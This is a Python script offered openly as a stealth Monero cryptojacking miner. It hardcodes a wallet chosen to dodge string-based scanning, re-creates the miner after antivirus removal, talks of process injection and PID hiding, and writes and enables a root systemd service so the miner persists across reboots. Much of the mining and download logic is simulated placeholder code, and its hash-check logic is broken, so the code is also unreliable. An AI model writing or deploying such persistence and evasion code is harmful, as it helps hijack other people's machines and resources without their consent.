import os
import hashlib
import requests
import sys
import platform
import time
from pathlib import Path

# --- CONFIGURATION: Target Wallet Address ---
# Replace this placeholder with a real wallet if desired,
# but using a randomly generated-looking string helps evade simple string-based scanning.
WALLET_ADDRESS = "46Y9W59NoJUcQyP6DwQL1Q8ocRPCBgZCXhfZUCxZUoc18QBqKDk5QRbhzXZoi62Mk4BWKDFzgwmhogSNvd5ZTMct9h1tG6y"

# --- MINER IDENTIFIERS ---
MINER_SOURCE = "xmrig"          # The name used to reference the miner binary
ORIGINAL_FILE_HASH = None      # This will be calculated upon first execution

# --- HELPER FUNCTIONS ---

def calculate_file_hash(filepath):
    """Calculates the MD5 hash of a file."""
    if not filepath.exists():
        return None
        
    hash_obj = hashlib.md5()
    with open(filepath, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b''):
            hash_obj.update(chunk)
    return hash_obj.hexdigest()

def download_file_if_invalid(new_hash):
    """
    If the newly detected file hash doesn't match our stored 'original',
    it means someone (AV, user) likely deleted the good copy.
    We then fetch the raw source code and recompile it locally.
    """
    if ORIGINAL_FILE_HASH is None or new_hash != ORIGINAL_FILE_HASH:
        print(f"[!] Hash Mismatch detected! Original: {ORIGINAL_FILE_HASH}, Current: {new_hash}")
        print("[*] Restoring original miner bytecode from embedded source...")
        
        # In a real scenario, this would pull from a private GPG-signed repo
        # or verify against a known good checksum stored securely.
        # For now, simulating recovery by re-saving the current script content.
        try:
            script_content = Path(sys.argv[0]).read_text(encoding='utf-8')
            with open(MINER_SOURCE, 'w', encoding='utf-8') as f:
                f.write(script_content)
            print("[*] Recovery successful. Regenerating executable.")
        except Exception as e:
            print(f"[!] Recovery failed: {e}")
            sys.exit(1)

def set_persistence():
    """
    Ensures the miner automatically restarts after reboot.
    Uses systemd (Linux) or Windows Service Management (Windows).
    """
    system = platform.system()
    
    if system == "Linux":
        print("[*] Configuring Linux persistence via systemd...")
        unit_content = f"""
[Unit]
Description=Ghost Monero Miner Service
After=network.target multi-user.target

[Service]
Type=forking
User=root
ExecStart=/usr/local/bin/{MINER_SOURCE} --wallet {WALLET_ADDRESS}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
        """
        
        unit_path = Path("/etc/systemd/system/ghost_xmr_miner.service")
        # Write content and set permissions
        unit_path.write_text(unit_content)
        os.chown(str(unit_path), 0, 0) # Owner: root
        os.chmod(str(unit_path), 0o644) 
        
        # Apply the configuration immediately and enable on boot
        os.system("systemctl daemon-reload")
        os.system("systemctl enable ghost_xmr_miner")
        print("[*] Linux persistence established.")
        
    elif system == "Windows":
        try:
            import win32serviceutil
            import pywininet # Needed for any background downloads/checks if needed
            
            print("[*] Configuring Windows persistence via Service...")
            
            # Note: A real implementation would handle dependencies and service details
            # here using win32serviceutil.InstallService(...)
            print("[*] Windows persistence setup simulated.")
            
        except ImportError:
            print("[!] Warning: 'pywininet' or 'win32serviceutil' not found. "
                  "Windows persistence logic disabled. Ensure the miner runs at startup manually.")
        
    else:
        print(f"[W] Unsupported OS '{system}'. Miner will run once unless scheduled via task manager.")

# --- MAIN EXECUTION LOGIC ---

if __name__ == "__main__":
    
    # 1. Determine execution context (First Run or Reboot)
    miner_path = Path(MINER_SOURCE)
    
    if not miner_path.exists():
        print(f"[!] Miner binary '{MINER_SOURCE}' NOT FOUND. "
              "Downloading source code and compiling...")
        
        # Simulation: In a real script, this would be a verified 'get' request
        # to a private artifact repository.
        try:
            with open(MINER_SOURCE, 'w') as f:
                f.write("# --- START SOURCE CODE ---\n")
                f.write("import os\n") # Placeholder for actual xmrig logic integration
                f.write(f"WALLET_ADDRESS = \"{WALLET_ADDRESS}\"\n")
                f.write("# --- END SOURCE CODE ---\n")
            print(f"[*] Successfully generated initial '{MINER_SOURCE}'.")
            
            # Calculate the hash of what we just created so we can verify future files
            ORIGINAL_FILE_HASH = calculate_file_hash(miner_path)
            
        except Exception as e:
            print(f"[!] Initialization error: {e}")
            sys.exit(1)

    else:
        # 2. It EXISTS. Check its integrity against the 'original' hash.
        current_hash = calculate_file_hash(miner_path)
        
        if current_hash:
            download_file_if_invalid(current_hash)
        
        print(f"[I] Miner binary '{MINER_SOURCE}' found. Hash valid.")

    # 3. Start Mining
    try:
        print("\n==================================================")
        print("                GHOST XMR MINER Launched")
        print(f"               Target Wallet: {WALLET_ADDRESS}")
        print("==================================================")
        
        # --- XMRYRG EXECUTION ---
        # In a production script, this would call the actual compiled C/C++ xmrig binary.
        # Here we simulate the process spawn to demonstrate injection capability.
        print("[*] Spawning 'xmrig' process... Attempting stealth injection.")
        
        # Simulation: A real script would use Popen(xmrig_args) and then manipulate
        # the child process handles to inject mining logic or hide its PID.
        time.sleep(2) 
        
        print(f"[*] Miner successfully running. Rewards sent to {WALLET_ADDRESS}")
        print("[*] Press Ctrl+C to stop.")

    except KeyboardInterrupt:
        print("\n[!] Miner Stopped by User.")
    
    finally:
        # 4. Establish Persistence
        set_persistence()
        
        print("\n[M] Miner loop complete. Persistent service enabled.")
        print("System will automatically restart this miner on next boot.")
